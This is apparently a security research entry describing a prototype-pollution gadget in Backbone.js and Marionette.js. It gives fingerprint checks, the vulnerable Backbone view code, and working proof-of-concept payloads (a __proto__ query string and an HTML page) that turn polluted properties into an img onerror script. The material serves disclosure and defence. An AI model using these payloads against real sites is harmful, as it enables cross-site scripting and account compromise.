## Marionette.js / Backbone.js

URL: https://marionettejs.com/  
URL: https://backbonejs.org/

### JS Fingerprint
```
return (typeof Marionette !== 'undefined')
return (typeof Backbone !== 'undefined' && typeof Backbone.VERSION !== 'undefined')
```

### Vulnerable code fragment
https://github.com/jashkenas/backbone/blob/153dc41616a1f2663e4a86b705fefd412ecb4a7a/backbone.js#L1435-L1436
```js
    _ensureElement: function() {
      if (!this.el) {
        var attrs = _.extend({}, _.result(this, 'attributes'));
        if (this.id) attrs.id = _.result(this, 'id');
        if (this.className) attrs['class'] = _.result(this, 'className');
        this.setElement(this._createElement(_.result(this, 'tagName')));
        this._setAttributes(attrs);
```

### PoC

```
?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)
```

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.11.0/underscore-min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone-min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/backbone.marionette/4.1.2/backbone.marionette.min.js"></script>
<script>
  Object.prototype.tagName = 'img'
  Object.prototype.src = ['x:x']
  Object.prototype.onerror = ['alert(1)']
</script>
<script>
(function() {
  var View = Mn.View.extend({template: '#template-layout'});
  var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});
  var app = new App();
  app.start();
})();
</script>
<div id="template-layout" type="x-template/underscore">xxx</div>
```